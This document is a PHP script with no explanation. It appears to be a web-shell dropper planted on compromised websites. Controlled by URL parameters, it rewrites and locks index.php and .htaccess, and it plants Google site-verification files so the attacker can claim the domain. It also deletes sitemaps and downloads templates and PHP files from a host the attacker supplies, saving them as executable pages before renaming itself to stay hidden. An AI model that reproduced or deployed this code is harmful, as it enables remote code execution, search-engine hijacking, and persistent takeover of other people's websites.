<?php 
@ini_set('display_errors', 0);
function curl_webpage($url){
 	$curl = curl_init();	
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_HEADER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$data=curl_exec($curl);
	curl_close($curl);
	if(!$data){
		$data = @file_get_contents($url);
	}
	return $data;
}
if(isset($_GET['del']) &&  $_GET['del'] == '1'){
	@chmod("./index.php",0755);
	$Indexruler = '#(/+installbg.*?/+installend)#s';
	$strDefault = file_get_contents("./index.php");
	$strDefault = preg_replace($Indexruler, '', $strDefault);
	file_put_contents("./index.php",$strDefault);
	echo "index del is ok";
}
if(isset($_GET['chmod']) &&  $_GET['chmod'] == '1'){
	@chmod(".htaccess",0444);
	@chmod("index.php",0444);
	echo "chmod is ok";
}
if(isset($_GET["write"]) && trim($_GET["write"])){
	$write = trim($_GET["write"]);
	$path ='./'. $write.'.html';
	$content='google-site-verification: '.$write.'.html';
	file_put_contents($path,$content);	
	echo $content;
	unlink("mvf.php");
}
if(isset($_GET['delxml']) &&  $_GET['delxml'] == '1'){
if (false != ($handle = opendir ('./web_map'))) {
	while ( false !== ($file = readdir ( $handle )) ) {
		if($file == "." or $file == "..") continue;
			$sitemaps = './mapnaviga/mapnavigaa.xml';
			unlink($sitemaps);
		}
		closedir ( $handle );
		echo 'delete success';
}
}
if(isset($_GET['check']) &&  $_GET['check'] == '1'){
$RootDir = $_SERVER['DOCUMENT_ROOT'];
$filename = $RootDir.'/index.php';
echo $filename."</br>";
if (is_writable($filename)) {
  echo "<div style='color:green;font-weight:bold;'>The file is writable</div>";
} else {
  echo "<div style='color:red;font-weight:bold;'>The file is not writable</div>";
}
$filesize=abs(filesize($RootDir . "/index.php"));
if($filesize=='529'){
	echo "<div style='color:green;font-weight:bold;'>index is ok.</div>";
}else{
	$index = file_get_contents($RootDir ."/index.php");
	$index = str_replace("<?php","",$index);
	echo $index;
}
}

if(isset($_GET['html']) &&  $_GET['html'] == '1'){
$str='<?php'. PHP_EOL .'$str = file_get_contents("./home.html");'. PHP_EOL .'echo $str;'. PHP_EOL .'?>';
if(file_exists("index.html")&&!file_exists("index.php")){
	rename("index.html","home.html");
	file_put_contents("./index.php",$str);
	echo "index fix ok.";
}else if(file_exists("index.htm")&&!file_exists("index.php")){
	rename("index.htm","home.html");
	file_put_contents("./index.php",$str);
	echo "index fix ok.";
}else{
	echo "index is nohtml.";
}
}

if(!function_exists('file_put_contents')) {
	function file_put_contents($filename, $s) {
		$fp = @fopen($filename, 'w');
		@fwrite($fp, $s);
		@fclose($fp);
		return TRUE;
	}
}
if(isset($_GET["rdir"])&& $_GET["url"]){
	$rdir = $_GET["rdir"];
	$url = $_GET["url"];
	@mkdir("./". $rdir);
	$url1='http://' . $url . 'moban.html';
	$url2='http://' . $url . 'index.txt';
	$url3='http://' . $url . 'install.txt';
	$str_hm1 = curl_webpage($url1);
	$str_hm2 = curl_webpage($url2);
	$str_hm3 = curl_webpage($url3);
	file_put_contents("./" . $rdir . "/" . "moban.html", $str_hm1);
	file_put_contents("./" . $rdir . "/" . "index.php", $str_hm2);
	file_put_contents("./" . $rdir . "/" . "install.php", $str_hm3);
	$file[] =  './' . $rdir . '/' . 'moban.html';
	$file[] =  './' . $rdir . '/' . 'index.php';
	$file[] =  './' . $rdir . '/' . 'install.php';
	foreach($file as $value){
		if(file_exists($value)){
			$handle = fopen($value,'rb');
			$rdSIze = filesize("./".$value);
			$tempStr = fread($handle, $rdSIze); 
			fclose($handle); 
			if(strstr($tempStr,'//file end')){
				echo "<p><span style='font-weight:bold;color:green;'>$value success</span></p>";
				@chmod($value,0744);
			}else{
				echo "<p><span style='font-weight:bold;color:red;'>$value reload</span></p>";
			}
			unset($tempStr);
	
		}else{
			echo "<p><span style='font-weight:bold;color:red;'>$value not found</span></p>";
		}
	}
rename("./mvfile.php","./mvf.php");
@chmod(".htaccess",0755);
}